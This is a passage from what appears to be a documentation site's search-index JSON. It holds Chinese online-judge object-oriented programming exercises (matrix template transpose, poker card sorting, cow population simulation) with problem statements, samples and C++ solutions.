\u9996\u5148\u8f93\u5165\u6570\u636e\u7c7b\u578b\uff0cI\u8868\u793aint\uff0cD\u8868\u793adouble\uff0cC\u8868\u793achar\uff0c\u63a5\u7740\u8f93\u5165\u4e24\u4e2a\u53c2\u6570m\u548cn\uff0c\u5206\u522b\u8868\u793a\u77e9\u9635\u7684\u884c\u548c\u5217 \u63a5\u4e0b\u6765\u8f93\u5165\u77e9\u9635\u7684\u5143\u7d20\uff0c\u4e00\u5171m\u884c\uff0c\u6bcf\u884cn\u4e2a\u6570\u636e \u8f93\u51fa \u8f93\u51fa\u8f6c\u7f6e\u540e\u7684\u77e9\u9635 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 2 I 2 3 1 2 3 4 5 6 C 3 3 a b c d e f g h i \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 1 4 2 5 3 6 a d g b e h c f i \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u51b7\u9759\u601d\u8003\u5c31\u80fd\u89e3\u51b3\u3002 \u770b\u5230\u6709\u540c\u5b66\u91cd\u8f7d [] \u8fd0\u7b97\u7b26\u65f6\u8fd4\u56de\u4e86\u4e00\u4e2a\u6307\u5411\u4e86T\u7684\u6307\u9488\uff08\u5373 T * \uff09\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u8bbf\u95ee\u5143\u7d20\u65f6\uff0c\u7b2c\u4e8c\u4e2a [] \u5c31\u662f\u5728\u7d22\u5f15\u6570\u7ec4\u4e86\u3002\u867d\u7136\u53ef\u4ee5\u505a\u5230\u662f\u5bf9\u7684\uff0c\u4f46\u662f\u6211\u603b\u89c9\u5f97\u5f88\u522b\u626d\uff0c\u5927\u6982\u662f\u6211\u89c9\u5f97\u4e0d\u5e94\u8be5\u76f4\u63a5\u53bb\u64cd\u4f5cclass\u4e2dprivate\u7684\u6210\u5458\u5427...\u4e2a\u4eba\u89c9\u5f97\u8fd8\u597d\u7684\u65b9\u6848\u5c31\u662f\u4e0b\u9762\u8fd9\u79cd\u8fd4\u56de\u7ed3\u6784\u4f53\u7684\uff0c\u6216\u662f\u5c01\u88c5\u4e00\u4e0b std::vector<std::vector<T> > \u4e5f\u90fd\u8fd8\u597d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 #include <iostream> template < typename T > class Matrix { public : Matrix ( size_t row , size_t col ) : row ( row ), col ( col ) { data = new T * [ row ]; for ( size_t i = 0 ; i < row ; ++ i ) { data [ i ] = new T [ col ]; } } void setFromCin () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { for ( size_t ic = 0 ; ic < col ; ++ ic ) { std :: cin >> data [ ir ][ ic ]; } } } void transport () { T ** tmp = new T * [ col ]; for ( size_t ir = 0 ; ir < col ; ++ ir ) { tmp [ ir ] = new T [ row ]; } for ( size_t ir = 0 ; ir < col ; ++ ir ) { for ( size_t ic = 0 ; ic < row ; ++ ic ) { tmp [ ir ][ ic ] = data [ ic ][ ir ]; } } for ( size_t ir = 0 ; ir < row ; ++ ir ) { delete []( data [ ir ]); } delete []( data ); std :: swap ( row , col ); data = tmp ; } void println () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { std :: cout << data [ ir ][ 0 ]; for ( size_t ic = 1 ; ic < col ; ++ ic ) { std :: cout << ' ' << data [ ir ][ ic ]; } std :: cout << std :: endl ; } } struct Row & operator []( int index ) { return Row ( data [ index ]); } ~ Matrix () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { delete []( data [ ir ]); } delete []( data ); } private : int row , col ; T ** data ; struct Row { explicit Row ( T * row ) : data ( row ) {} T operator []( int index ) { return data [ index ]; } T * data ; }; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { char type ; std :: cin >> type ; int row , col ; std :: cin >> row >> col ; switch ( type ) { case 'I' : { Matrix < int > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } case 'D' : { Matrix < double > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } case 'C' : { Matrix < char > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } default : ; } } return 0 ; }","title":"\u77e9\u9635\u7c7b\u6a21\u677f\uff08\u7c7b\u6a21\u677f\uff09"},{"location":"szu_oj/oop/1156/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u77e9\u9635\u7c7b\u6a21\u677f\uff08\u7c7b\u6a21\u677f\uff09"},{"location":"szu_oj/oop/1156/#_2","text":"\u8bbe\u8ba1\u4e00\u4e2a\u77e9\u9635\u7c7b\u6a21\u677fMatrix\uff0c\u652f\u6301\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u6570\u636e\u3002 \u8981\u6c42\u81f3\u5c11\u5305\u542b2\u4e2a\u6210\u5458\u51fd\u6570\uff1a\u77e9\u9635\u8f6c\u7f6e\u51fd\u6570transport\u3001\u4ee5\u53ca\u6253\u5370\u8f93\u51fa\u51fd\u6570print \u7f16\u5199main\u51fd\u6570\u8fdb\u884c\u6d4b\u8bd5\uff0c\u8c03\u7528\u7c7b\u7684\u6210\u5458\u51fd\u6570\u5b8c\u6210\u8f6c\u7f6e\u548c\u8f93\u51fa\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1156/#_3","text":"\u7b2c\u4e00\u884c\u5148\u8f93\u5165t\uff0c\u8868\u793a\u6709t\u4e2a\u6d4b\u8bd5\u7528\u4f8b \u4ece\u7b2c\u4e8c\u884c\u5f00\u59cb\u8f93\u5165\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u7684\u6570\u636e\u3002 \u9996\u5148\u8f93\u5165\u6570\u636e\u7c7b\u578b\uff0cI\u8868\u793aint\uff0cD\u8868\u793adouble\uff0cC\u8868\u793achar\uff0c\u63a5\u7740\u8f93\u5165\u4e24\u4e2a\u53c2\u6570m\u548cn\uff0c\u5206\u522b\u8868\u793a\u77e9\u9635\u7684\u884c\u548c\u5217 \u63a5\u4e0b\u6765\u8f93\u5165\u77e9\u9635\u7684\u5143\u7d20\uff0c\u4e00\u5171m\u884c\uff0c\u6bcf\u884cn\u4e2a\u6570\u636e","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1156/#_4","text":"\u8f93\u51fa\u8f6c\u7f6e\u540e\u7684\u77e9\u9635","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1156/#_5","text":"1 2 3 4 5 6 7 8 2 I 2 3 1 2 3 4 5 6 C 3 3 a b c d e f g h i","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1156/#_6","text":"1 2 3 4 5 6 1 4 2 5 3 6 a d g b e h c f i","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1156/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1156/#_8","text":"\u51b7\u9759\u601d\u8003\u5c31\u80fd\u89e3\u51b3\u3002 \u770b\u5230\u6709\u540c\u5b66\u91cd\u8f7d [] \u8fd0\u7b97\u7b26\u65f6\u8fd4\u56de\u4e86\u4e00\u4e2a\u6307\u5411\u4e86T\u7684\u6307\u9488\uff08\u5373 T * \uff09\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u8bbf\u95ee\u5143\u7d20\u65f6\uff0c\u7b2c\u4e8c\u4e2a [] \u5c31\u662f\u5728\u7d22\u5f15\u6570\u7ec4\u4e86\u3002\u867d\u7136\u53ef\u4ee5\u505a\u5230\u662f\u5bf9\u7684\uff0c\u4f46\u662f\u6211\u603b\u89c9\u5f97\u5f88\u522b\u626d\uff0c\u5927\u6982\u662f\u6211\u89c9\u5f97\u4e0d\u5e94\u8be5\u76f4\u63a5\u53bb\u64cd\u4f5cclass\u4e2dprivate\u7684\u6210\u5458\u5427...\u4e2a\u4eba\u89c9\u5f97\u8fd8\u597d\u7684\u65b9\u6848\u5c31\u662f\u4e0b\u9762\u8fd9\u79cd\u8fd4\u56de\u7ed3\u6784\u4f53\u7684\uff0c\u6216\u662f\u5c01\u88c5\u4e00\u4e0b std::vector<std::vector<T> > \u4e5f\u90fd\u8fd8\u597d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 #include <iostream> template < typename T > class Matrix { public : Matrix ( size_t row , size_t col ) : row ( row ), col ( col ) { data = new T * [ row ]; for ( size_t i = 0 ; i < row ; ++ i ) { data [ i ] = new T [ col ]; } } void setFromCin () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { for ( size_t ic = 0 ; ic < col ; ++ ic ) { std :: cin >> data [ ir ][ ic ]; } } } void transport () { T ** tmp = new T * [ col ]; for ( size_t ir = 0 ; ir < col ; ++ ir ) { tmp [ ir ] = new T [ row ]; } for ( size_t ir = 0 ; ir < col ; ++ ir ) { for ( size_t ic = 0 ; ic < row ; ++ ic ) { tmp [ ir ][ ic ] = data [ ic ][ ir ]; } } for ( size_t ir = 0 ; ir < row ; ++ ir ) { delete []( data [ ir ]); } delete []( data ); std :: swap ( row , col ); data = tmp ; } void println () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { std :: cout << data [ ir ][ 0 ]; for ( size_t ic = 1 ; ic < col ; ++ ic ) { std :: cout << ' ' << data [ ir ][ ic ]; } std :: cout << std :: endl ; } } struct Row & operator []( int index ) { return Row ( data [ index ]); } ~ Matrix () { for ( size_t ir = 0 ; ir < row ; ++ ir ) { delete []( data [ ir ]); } delete []( data ); } private : int row , col ; T ** data ; struct Row { explicit Row ( T * row ) : data ( row ) {} T operator []( int index ) { return data [ index ]; } T * data ; }; }; int main () { int T ; std :: cin >> T ; while ( T -- ) { char type ; std :: cin >> type ; int row , col ; std :: cin >> row >> col ; switch ( type ) { case 'I' : { Matrix < int > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } case 'D' : { Matrix < double > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } case 'C' : { Matrix < char > matrix ( row , col ); matrix . setFromCin (); matrix . transport (); matrix . println (); break ; } default : ; } } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1190/","text":"\u6251\u514b\u724c\u6392\u5e8f\uff08\u7ed3\u6784\u4f53\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u81ea\u5b9a\u4e49\u7ed3\u6784\u4f53\u8868\u793a\u4e00\u5f20\u6251\u514b\u724c\uff0c\u5305\u542b\u7c7b\u578b\u2014\u2014\u9ed1\u6843\u3001\u7ea2\u6843\u3001\u6885\u82b1\u3001\u65b9\u5757\u3001\u738b\uff1b\u5927\u5c0f\u2014\u20142,3,4,5,6,7,8,9,10,J,Q,K,A,\u5c0f\u738b(\u75280\u8868\u793a\uff09\u3001\u5927\u738b\uff08\u75281\u8868\u793a\uff09\u3002\u8f93\u5165n\uff0c\u8f93\u5165n\u5f20\u6251\u514b\u724c\u4fe1\u606f\uff0c\u4ece\u5927\u5230\u5c0f\u8f93\u51fa\u5b83\u4eec\u7684\u6392\u5e8f\u7ed3\u679c\u3002 \u5047\u8bbe\u6251\u514b\u724c\u7684\u6392\u5e8f\u89c4\u5219\u662f\u5927\u738b\u3001\u5c0f\u738b\u4e3a\u7b2c\u4e00\u5927\u3001\u7b2c\u4e8c\u5927\uff0c\u5269\u4f5952\u5f20\u6251\u514b\u724c\u6309\u7167\u5148\u82b1\u8272\u540e\u5927\u5c0f\u6392\u5e8f\u3002 \u82b1\u8272\uff1a\u9ed1\u6843>\u7ea2\u6843>\u6885\u82b1>\u65b9\u5757\u3002 \u5927\u5c0f: A>K>Q>J>>10>9>...>2\u3002 \u63d0\u793a\uff1a\u767e\u5ea6sort\u51fd\u6570\u3001strstr\u51fd\u6570\u4f7f\u7528\u3002 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e24\u884c\uff1a \u7b2c\u4e00\u884c\uff1an\uff0c\u8868\u793a\u8f93\u5165n\u5f20\u6251\u514b\u724c \u7b2c\u4e8c\u884c\uff1an\u5f20\u6251\u514b\u724c\u4fe1\u606f\uff0c\u683c\u5f0f\u89c1\u6837\u4f8b \u8f93\u51fa \u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5e8f\u7ed3\u679c \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 3 5 \u9ed1\u6843 4 \u7ea2\u6843 10 \u6885\u82b1 Q \u65b9\u5757 K \u9ed1\u6843 A 10 \u5927\u738b \u6885\u82b1 10 \u7ea2\u6843 K \u65b9\u5757 9 \u9ed1\u6843 2 \u6885\u82b1 A \u65b9\u5757 Q \u5c0f\u738b \u9ed1\u6843 8 \u9ed1\u6843 J 5 \u7ea2\u6843 K \u6885\u82b1 K \u9ed1\u6843 K \u65b9\u5757 K \u5c0f\u738b \u6837\u4f8b\u8f93\u51fa 1 2 3 \u9ed1\u6843 A \u9ed1\u6843 4 \u7ea2\u6843 10 \u6885\u82b1 Q \u65b9\u5757 K \u5927\u738b \u5c0f\u738b \u9ed1\u6843 J \u9ed1\u6843 8 \u9ed1\u6843 2 \u7ea2\u6843 K \u6885\u82b1 A \u6885\u82b1 10 \u65b9\u5757 Q \u65b9\u5757 9 \u5c0f\u738b \u9ed1\u6843 K \u7ea2\u6843 K \u6885\u82b1 K \u65b9\u5757 K \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #include <iostream> #include <string> #include <vector> #include <algorithm> #include <assert.h> class Poker { public : friend std :: istream & operator >> ( std :: istream & in , Poker & poker ) { in >> poker . info ; return in ; } friend std :: ostream & operator << ( std :: ostream & out , const Poker & poker ) { out << poker . info ; return out ; } bool operator < ( const Poker & rhs ) const { if ( this -> typeValue () != rhs . typeValue ()) { return this -> typeValue () < rhs . typeValue (); } else { return this -> sizeValue () < rhs . sizeValue (); } } private : std :: string info ; int typeValue () const { std :: string type ; if ( info . find ( \"\u5927\u738b\" ) != std :: string :: npos ) { return 6 ; } else if ( info . find ( \"\u5c0f\u738b\" ) != std :: string :: npos ) { return 5 ; } else if ( info . find ( \"\u9ed1\u6843\" ) != std :: string :: npos ) { return 4 ; } else if ( info . find ( \"\u7ea2\u6843\" ) != std :: string :: npos ) { return 3 ; } else if ( info . find ( \"\u6885\u82b1\" ) != std :: string :: npos ) { return 2 ; } else if ( info . find ( \"\u65b9\u5757\" ) != std :: string :: npos ) { return 1 ; } assert ( 0 ); } int sizeValue () const { char back = info [ info . length () - 1 ]; switch ( back ) { default : return back - '0' ; case '0' : return 10 ; case 'J' : return 11 ; case 'Q' : return 12 ; case 'K' : return 13 ; case 'A' : return 14 ; } } }; int main () { size_t T ; std :: cin >> T ; while ( T -- ) { size_t size ; std :: cin >> size ; std :: vector < Poker > vector ( size ); for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cin >> vector [ i ]; } std :: sort ( vector . rbegin (), vector . rend ()); std :: cout << vector . front (); for ( size_t i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; } return 0 ; } \u53c2\u8003 Check if a string contains a string in C++ Does Overloading Operator<< works inside the class? std::sort","title":"\u6251\u514b\u724c\u6392\u5e8f\uff08\u7ed3\u6784\u4f53\uff09"},{"location":"szu_oj/oop/1190/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u6251\u514b\u724c\u6392\u5e8f\uff08\u7ed3\u6784\u4f53\uff09"},{"location":"szu_oj/oop/1190/#_2","text":"\u81ea\u5b9a\u4e49\u7ed3\u6784\u4f53\u8868\u793a\u4e00\u5f20\u6251\u514b\u724c\uff0c\u5305\u542b\u7c7b\u578b\u2014\u2014\u9ed1\u6843\u3001\u7ea2\u6843\u3001\u6885\u82b1\u3001\u65b9\u5757\u3001\u738b\uff1b\u5927\u5c0f\u2014\u20142,3,4,5,6,7,8,9,10,J,Q,K,A,\u5c0f\u738b(\u75280\u8868\u793a\uff09\u3001\u5927\u738b\uff08\u75281\u8868\u793a\uff09\u3002\u8f93\u5165n\uff0c\u8f93\u5165n\u5f20\u6251\u514b\u724c\u4fe1\u606f\uff0c\u4ece\u5927\u5230\u5c0f\u8f93\u51fa\u5b83\u4eec\u7684\u6392\u5e8f\u7ed3\u679c\u3002 \u5047\u8bbe\u6251\u514b\u724c\u7684\u6392\u5e8f\u89c4\u5219\u662f\u5927\u738b\u3001\u5c0f\u738b\u4e3a\u7b2c\u4e00\u5927\u3001\u7b2c\u4e8c\u5927\uff0c\u5269\u4f5952\u5f20\u6251\u514b\u724c\u6309\u7167\u5148\u82b1\u8272\u540e\u5927\u5c0f\u6392\u5e8f\u3002 \u82b1\u8272\uff1a\u9ed1\u6843>\u7ea2\u6843>\u6885\u82b1>\u65b9\u5757\u3002 \u5927\u5c0f: A>K>Q>J>>10>9>...>2\u3002 \u63d0\u793a\uff1a\u767e\u5ea6sort\u51fd\u6570\u3001strstr\u51fd\u6570\u4f7f\u7528\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1190/#_3","text":"\u6d4b\u8bd5\u6b21\u6570t \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u4e24\u884c\uff1a \u7b2c\u4e00\u884c\uff1an\uff0c\u8868\u793a\u8f93\u5165n\u5f20\u6251\u514b\u724c \u7b2c\u4e8c\u884c\uff1an\u5f20\u6251\u514b\u724c\u4fe1\u606f\uff0c\u683c\u5f0f\u89c1\u6837\u4f8b","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1190/#_4","text":"\u5bf9\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\uff0c\u8f93\u51fa\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5e8f\u7ed3\u679c","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1190/#_5","text":"1 2 3 4 5 6 7 3 5 \u9ed1\u6843 4 \u7ea2\u6843 10 \u6885\u82b1 Q \u65b9\u5757 K \u9ed1\u6843 A 10 \u5927\u738b \u6885\u82b1 10 \u7ea2\u6843 K \u65b9\u5757 9 \u9ed1\u6843 2 \u6885\u82b1 A \u65b9\u5757 Q \u5c0f\u738b \u9ed1\u6843 8 \u9ed1\u6843 J 5 \u7ea2\u6843 K \u6885\u82b1 K \u9ed1\u6843 K \u65b9\u5757 K \u5c0f\u738b","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1190/#_6","text":"1 2 3 \u9ed1\u6843 A \u9ed1\u6843 4 \u7ea2\u6843 10 \u6885\u82b1 Q \u65b9\u5757 K \u5927\u738b \u5c0f\u738b \u9ed1\u6843 J \u9ed1\u6843 8 \u9ed1\u6843 2 \u7ea2\u6843 K \u6885\u82b1 A \u6885\u82b1 10 \u65b9\u5757 Q \u65b9\u5757 9 \u5c0f\u738b \u9ed1\u6843 K \u7ea2\u6843 K \u6885\u82b1 K \u65b9\u5757 K","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/oop/1190/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/oop/1190/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #include <iostream> #include <string> #include <vector> #include <algorithm> #include <assert.h> class Poker { public : friend std :: istream & operator >> ( std :: istream & in , Poker & poker ) { in >> poker . info ; return in ; } friend std :: ostream & operator << ( std :: ostream & out , const Poker & poker ) { out << poker . info ; return out ; } bool operator < ( const Poker & rhs ) const { if ( this -> typeValue () != rhs . typeValue ()) { return this -> typeValue () < rhs . typeValue (); } else { return this -> sizeValue () < rhs . sizeValue (); } } private : std :: string info ; int typeValue () const { std :: string type ; if ( info . find ( \"\u5927\u738b\" ) != std :: string :: npos ) { return 6 ; } else if ( info . find ( \"\u5c0f\u738b\" ) != std :: string :: npos ) { return 5 ; } else if ( info . find ( \"\u9ed1\u6843\" ) != std :: string :: npos ) { return 4 ; } else if ( info . find ( \"\u7ea2\u6843\" ) != std :: string :: npos ) { return 3 ; } else if ( info . find ( \"\u6885\u82b1\" ) != std :: string :: npos ) { return 2 ; } else if ( info . find ( \"\u65b9\u5757\" ) != std :: string :: npos ) { return 1 ; } assert ( 0 ); } int sizeValue () const { char back = info [ info . length () - 1 ]; switch ( back ) { default : return back - '0' ; case '0' : return 10 ; case 'J' : return 11 ; case 'Q' : return 12 ; case 'K' : return 13 ; case 'A' : return 14 ; } } }; int main () { size_t T ; std :: cin >> T ; while ( T -- ) { size_t size ; std :: cin >> size ; std :: vector < Poker > vector ( size ); for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cin >> vector [ i ]; } std :: sort ( vector . rbegin (), vector . rend ()); std :: cout << vector . front (); for ( size_t i = 1 ; i < vector . size (); ++ i ) { std :: cout << ' ' << vector [ i ]; } std :: cout << std :: endl ; } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/oop/1190/#_9","text":"Check if a string contains a string in C++ Does Overloading Operator<< works inside the class? std::sort","title":"\u53c2\u8003"},{"location":"szu_oj/oop/1226/","text":"\u6bcd\u725b\u751f\u5c0f\u725b\u95ee\u9898(\u9759\u6001\u6570\u636e\u6210\u5458\u4e0e\u9759\u6001\u6210\u5458\u51fd\u6570) \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5047\u8bbe\u6bcd\u725b\u4ece\u51fa\u751f\u8d77\u7b2c4\u4e2a\u5e74\u5934\u5f00\u59cb\u6bcf\u5e74\u53ef\u4ee5\u751f\u4e00\u5934\u5c0f\u6bcd\u725b\uff0c\u4f46\u662f\u7b2c11\u5e74\u540e\u6b7b\u4ea1\u3002\u6309\u6b64\u89c4\u5f8b\uff0c\u7b2cn\u5e74\u65f6\u6709\u591a\u5c11\u5934\u6bcd\u725b\uff1f(\u5047\u8bben\u4e0d\u5927\u4e8e30) \u5b9a\u4e49\u4e00\u4e2a\u6bcd\u725b\u7c7bCCow\uff0c\u80fd\u591f\u7528\u52a8\u6001\u521b\u5efa\u548c\u64a4\u6d88\u7c7b\u5bf9\u8c61\u7684\u65b9\u5f0f\u6765\u6a21\u62df\u5c0f\u6bcd\u725b\u7684\u51fa\u751f\u548c\u6b7b\u4ea1\u89c4\u5f8b\u3002\u8bd5\u7f16\u5199C++\u7a0b\u5e8f\u5b8c\u6210\u4e0a\u8ff0\u8ba1\u7b97\u3002 \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u6d4b\u8bd5\u6b21\u6570 \u6bcf\u6b21\u6d4b\u8bd5\u8f93\u5165\u4e00\u884c\uff0c\u8868\u793a\u7b2c\u51e0\u5e74\u7684\u6574\u6570n(<=30) \u8f93\u51fa \u6bcf\u6b21\u6d4b\u8bd5\u8f93\u51fa\u4e00\u884c\uff0c\u7b2cn\u5e74\u7684\u6bcd\u725b\u603b\u6570 \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 7 30 25 \u6837\u4f8b\u8f93\u51fa 1 2 3 6 28364 4530 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 \u989d\uff0c\u5199\u5b8c\u624d\u770b\u5230\u6807\u9898...\u61d2\u5f97\u6539\u4e86\uff0c\u4e8b\u5b9e\u4e0a\u53ea\u8981\u53bb\u6389Solver\u7c7b\u518d\u7a0d\u52a0\u6539\u52a8\u5c31\u53ef\u4ee5\u7b26\u5408\u8981\u6c42\u3002 \u8fd9\u91cc\u4e3b\u8981\u601d\u8def\u5c31\u662f\u76f8\u5f53\u4e8e\u6709\u4e00\u4e2a\u4e0a\u5e1d\u89c6\u89d2\uff1a std::vector<Cow *> cows \uff0c\u770b\u7740\u6240\u6709\u7684\u725b\u3002\u6bcf\u6b21\u5faa\u73af\u610f\u5473\u7740\u8fc7\u53bb\u4e00\u5e74\uff0c\u4e8e\u662f\u8ba9\u6240\u6709\u725b\u6210\u957f\u3001\u51fa\u751f\u6216\u662f\u6b7b\u4ea1\u3002 \u66f4\u65b0\uff1a\u7a81\u7136\u53d1\u73b0\u8fd8\u5fd8\u8bb0 delete \uff0c\u522b\u9524\u6211... \u53e6\u5916\u6bcf\u6b21\u6539\u52a8\u5bb9\u5668\u65f6\u67d0\u4e9b\u60c5\u51b5\u4f1a\u8ba9\u8fed\u4ee3\u5668\u5931\u6548\uff0c\u592a\u4e45\u6ca1\u770b\u300aEffective STL\u300b\u4e86\uff0c\u6709\u7a7a\u627e\u6765\u8fd9\u91cc\u8865\u4e0a\u4e00\u70b9\u4e1c\u897f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 #include <iostream> #include <vector> class CowSolver { public : explicit CowSolver ( int limit ) : limit ( limit ) { cows . push_back ( new Cow ()); for ( int i = 1 ; i < limit ; ++ i ) { growUp (); create (); kill (); } } void println () { std :: cout << cows . size () << std :: endl ; } private : struct Cow { Cow () : age ( 1 ) {} int age ; }; int limit ; std :: vector < Cow *> cows ; void growUp () { for ( auto item : cows ) { item -> age += 1 ; } } void create () { for ( int i = 0 ; i < cows . size (); ++ i ) { if ( 4 <= cows [ i ] -> age && cows [ i ] -> age < 11 ) { cows . push_back ( new Cow ()); } } } void kill () { for ( auto it = cows . begin (); it != cows . end ();) { if (( * it ) -> age == 11 ) { it = cows . erase ( it ); } else { ++ it ; } } } }; int main () { int T ; std :: cin >> T ; while ( T -- ) { int year ; std :: cin >> year ; CowSolver cowSolver ( year ); cowSolver . println (); } return 0 ; }","title":"\u6bcd\u725b\u751f\u5c0f\u725b\u95ee\u9898(\u9759\u6001\u6570\u636e\u6210\u5458\u4e0e\u9759\u6001\u6210\u5458\u51fd\u6570)"},{"location":"szu_oj/oop/1226/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u6bcd\u725b\u751f\u5c0f\u725b\u95ee\u9898(\u9759\u6001\u6570\u636e\u6210\u5458\u4e0e\u9759\u6001\u6210\u5458\u51fd\u6570)"},{"location":"szu_oj/oop/1226/#_2","text":"\u5047\u8bbe\u6bcd\u725b\u4ece\u51fa\u751f\u8d77\u7b2c4\u4e2a\u5e74\u5934\u5f00\u59cb\u6bcf\u5e74\u53ef\u4ee5\u751f\u4e00\u5934\u5c0f\u6bcd\u725b\uff0c\u4f46\u662f\u7b2c11\u5e74\u540e\u6b7b\u4ea1\u3002\u6309\u6b64\u89c4\u5f8b\uff0c\u7b2cn\u5e74\u65f6\u6709\u591a\u5c11\u5934\u6bcd\u725b\uff1f(\u5047\u8bben\u4e0d\u5927\u4e8e30) \u5b9a\u4e49\u4e00\u4e2a\u6bcd\u725b\u7c7bCCow\uff0c\u80fd\u591f\u7528\u52a8\u6001\u521b\u5efa\u548c\u64a4\u6d88\u7c7b\u5bf9\u8c61\u7684\u65b9\u5f0f\u6765\u6a21\u62df\u5c0f\u6bcd\u725b\u7684\u51fa\u751f\u548c\u6b7b\u4ea1\u89c4\u5f8b\u3002\u8bd5\u7f16\u5199C++\u7a0b\u5e8f\u5b8c\u6210\u4e0a\u8ff0\u8ba1\u7b97\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/oop/1226/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u6d4b\u8bd5\u6b21\u6570 \u6bcf\u6b21\u6d4b\u8bd5\u8f93\u5165\u4e00\u884c\uff0c\u8868\u793a\u7b2c\u51e0\u5e74\u7684\u6574\u6570n(<=30)","title":"\u8f93\u5165"},{"location":"szu_oj/oop/1226/#_4","text":"\u6bcf\u6b21\u6d4b\u8bd5\u8f93\u51fa\u4e00\u884c\uff0c\u7b2cn\u5e74\u7684\u6bcd\u725b\u603b\u6570","title":"\u8f93\u51fa"},{"location":"szu_oj/oop/1226/#_5","text":"1 2 3 4 3 7 30 25","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/oop/1226/#_6","text":"1 2 